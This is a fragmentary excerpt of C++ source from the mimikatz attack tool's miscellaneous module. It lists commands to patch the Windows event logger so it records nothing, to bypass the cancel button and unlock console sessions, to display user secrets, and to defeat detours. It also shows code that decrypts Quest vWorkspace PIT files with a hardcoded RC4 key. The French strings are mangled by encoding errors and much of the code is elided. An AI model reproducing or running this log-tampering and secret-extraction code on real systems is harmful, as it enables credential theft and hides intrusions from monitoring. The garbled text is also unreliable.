...
vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> mod_mimikatz_divers::getMimiKatzCommands()
{
	...
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(eventdrop,	L"eventdrop",	L"[super experimental] Patch l\'observateur d\'関閚ements pour ne plus rien enregistrer"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(cancelator,	L"cancelator",	L"Patch le bouton annuler de Windows XP et 2003 en console pour d関errouiller une session"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(secrets,		L"secrets",		L"Affiche les secrets utilisateur"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(nodetour,	L":nodetour",	L"Anti-d閠ours SR"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(pitme,		L":pitme",		L"D閏hiffre les fichiers PIT (Quest vWorkspace Client)"));
	return monVector;
}
...
bool mod_mimikatz_divers::nodetour(vector<wstring> * arguments)
{
	...
	if(mod_patch::checkVersion(&mesOS))
	{
		...
		if(memcmp(monNTDLLptr + 8, monDetouredStub, sizeof(monDetouredStub)) == 0)
		{
			...
			(*outputStream) << L"D閠our non trouv? "<< endl;
	}
	return true;
}
...
bool mod_mimikatz_divers::pitme(vector<wstring> * arguments)
{
	...
	else
	{
		...
		if(error == 0)
		{
			...
			(*outputStream) << L"OK" << endl << L" * D閏hiffrement n? : ";
			if(mod_crypto::genericDecrypt(monBuffer, tailleFichierSource, HARDCODED_KEY, sizeof(HARDCODED_KEY), CALG_RC4))
			{
				...
				{
					(*outputStream) << L"OK" << endl << L" * En-t阾e : ";
					if(memcmp(monBuffer, HEADER_PIT, sizeof(HEADER_PIT)) == 0)
					{
						...
						if(arguments->size() > 1)
						{
							(*outputStream) << L" * Ouverture en 閏riture du fichier \'" << arguments->back() << L"\' : ";
						...
						else (*outputStream) << L" * Donn閑s : " << endl << endl << wstring(reinterpret_cast<char *>(monBufferData), reinterpret_cast<char *>(monBufferData + tailleData)) << endl;
					}
					else (*outputStream) << L"KO - diff閞ent de \'PIT\' ; " << mod_text::stringOfHex(HEADER_PIT, sizeof(HEADER_PIT)) << L" != " << mod_text::stringOfHex(monBuffer, sizeof(HEADER_PIT)) << endl;
				}
